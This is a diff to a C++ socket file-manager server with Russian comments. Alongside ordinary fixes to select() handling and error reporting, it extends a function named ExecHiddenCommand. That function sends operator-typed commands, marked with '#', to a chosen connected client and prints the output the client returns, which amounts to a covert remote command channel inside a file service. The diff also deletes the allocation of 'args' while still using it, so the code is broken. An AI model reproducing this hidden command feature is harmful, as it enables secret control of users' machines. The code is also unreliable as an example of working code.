@@ -20,16 +20,21 @@ using std::cout;
 using std::endl;
 using std::cerr;
 
+void FileManager::VectorUniquePush(std::vector<sockaddr_in>& vec, sockaddr_in elem)
+{
+    auto founded = find_if(vec.begin(), vec.end(), [&](auto it) {return it.sin_port == elem.sin_port; });
+    if (founded != vec.end())
+        return;
+    else
+        vec.push_back(elem);
+
+    return;
+}
+
 void FileManager::run()
 {
     if (StartServer() == -1)
         return;
-
-
-    //// Устанавливаем сокет в неблокирующий режим
-    //u_long mode = 1;
-    //if (ioctlsocket(socket_, FIONBIO, &mode) != 0)
-    //    std::cerr << "Ошибка при установке сокета в неблокирующий режим." << std::endl;
 
     // Устанавливаем минимальный маймаут ожидания
     timeval timeout;
@@ -37,8 +42,6 @@ void FileManager::run()
     timeout.tv_usec = 1;
 
     fd_set readSet;
-    FD_ZERO(&readSet);
-    FD_SET(socket_, &readSet);
 
     // Инициализируем пул потоков
     InitializeThreadpoolEnvironment(&call_back_environ_);
@@ -65,6 +68,8 @@ void FileManager::run()
     {
         // Проверяем наличие данных на чтение от клиента
         request_str.clear();
+        FD_ZERO(&readSet);
+        FD_SET(socket_, &readSet);
         int result = select(0, &readSet, nullptr, nullptr, &timeout);
         if (result == SOCKET_ERROR)
         {
@@ -77,13 +82,14 @@ void FileManager::run()
 
         if (!request_str.empty())
         {
+            VectorUniquePush(clients_addr_, client);
+
             // Если получены данные от клиента, определяем их назначение
             // Если это результат выполнения команды - оповещаем залоченный поток
             // Если данные это запрос клиента - выделяем запрос в отдельный поток
             if (request_str[0] == '#')
             {
                 request_str.erase(0, 1);
-                Args* args = new Args;
                 args->data_ = request_str;
                 args->client_addr_ = client;
                 args->ptr_ = this;
@@ -108,6 +114,7 @@ void FileManager::run()
         }
 
     }
+    delete args;
 }
 
 int FileManager::StartServer()
@@ -272,6 +279,7 @@ void FileManager::ExecHiddenCommand()
         cmd.clear();
         cout << "cmd: ";
         getline(cin, cmd);
+        cmd.insert(0, "#");
         cout << "Available users:" << endl;
         {
             lock_guard<mutex> lock(mt_);
@@ -282,25 +290,28 @@ void FileManager::ExecHiddenCommand()
                 system("cls");
                 continue;
             }
+
             int i = 0;
             for (auto it : clients_addr_)
             {
-                cout << "id : [" << i << "]" << endl;
+                cout << "\n\tID: " << i << "\n\tUsers port: " << it.sin_port << endl;
+                i++;
             }
             cout << "Select users id: ";
         }
         cin >> users_id;
-        sockaddr_in client_addr = clients_addr_[users_id];
         {
             unique_lock<mutex> lock(mt_);
-            requests_q.push(std::make_pair(cmd, client_addr));
+            requests_q.push(std::make_pair(cmd, clients_addr_[users_id]));
 
-            cv_.wait(lock, [&] {return !client_data_.empty(); });
+            cv_.wait_for(lock, std::chrono::seconds(20), [&] {return !client_data_.empty(); });
             cmd = client_data_;
             client_data_.clear();
         }
-        cout << endl <<  "Output: " << cmd << endl;
-        
+        if (!cmd.empty())
+            cout << endl << "==================_Output_==================" << endl << cmd << "============================================" << endl;
+        else
+            cout << endl << "Could not wait for the output of the command!" << endl;
         getline(cin, cmd);
     }
 }
@@ -313,17 +324,25 @@ int FileManager::ExecuteCommand(string command, sockaddr_in client_addr)
     ss >> command >> arg1;
     if (command.empty())
     {
-        cerr << "Invalid arguments" << endl;
         last_error_ = "Invalid arguments";
-        SendData(last_error_, client_addr);
+        requests_q.push(make_pair(last_error_, client_addr));
         return 0;
     }
-    Command cmd = static_cast<Command>(std::stoi(command));
+
+    Command cmd;
+    try {
+        cmd = static_cast<Command>(std::stoi(command));
+    }
+    catch(const std::exception &ex)
+    {
+        last_error_ = "Invalid command!";
+        requests_q.push(make_pair(last_error_, client_addr));
+        return 0;
+    }
     if (cmd != kList and arg1.empty())
     {
-        cerr << "Invalid arguments" << endl;
         last_error_ = "Invalid arguments";
-        SendData(last_error_, client_addr);
+        requests_q.push(make_pair(last_error_, client_addr));
         return 0;
     }
     if (cmd == kWrite or cmd == kAppend)
@@ -331,8 +350,9 @@ int FileManager::ExecuteCommand(string command, sockaddr_in client_addr)
         std::getline(ss, arg2);
         if (arg2.empty())
         {
-            cerr << "Invalid arguments" << endl;
-            return -1;
+            last_error_ = "Invalid arguments";
+            requests_q.push(make_pair(last_error_, client_addr));
+            return 0;
         }
         arg2.erase(0, 1);
     }
@@ -393,7 +413,6 @@ int FileManager::MyCreateFile(string name)
     }
     else
     {
-        cerr << "File creation error!" << endl;
         last_error_ = "File creation error. Such a file already exists.";
         return -1;
     }
@@ -403,7 +422,6 @@ int FileManager::MyDeleteFile(string filename)
 {
     if (remove(string{ DEF_PATH + filename }.c_str()) != 0)
     {
-        cerr << "File deletion error: " << filename << endl;
         last_error_ = "File deletion error";
         return -1;
     }
@@ -415,7 +433,6 @@ int FileManager::Read(string filename, string &file_data)
     fstream file(DEF_PATH + filename);
     if (!file.good())
     {
-        cerr << "Error opening a file for reading!";
         last_error_ = "File opening error. There is no such file";
         return -1;
     }
@@ -436,7 +453,6 @@ int FileManager::Write(string filename, string data, Command cmd)
 
     if (!file.good())
     {
-        cerr << "Error opening a file for writing!";
         last_error_ = "File opening error. There is no such file";
         return -1;
     }
@@ -453,7 +469,7 @@ int FileManager::GetFileList(string& file_list)
         for (const auto& entry : std::filesystem::directory_iterator(DEF_PATH)) 
         {
             if (std::filesystem::is_regular_file(entry))
-                file_list += entry.path().string() + "\n";
+                file_list += entry.path().string().erase(0, sizeof(DEF_PATH) -1) + "\n";
         }
     }
 
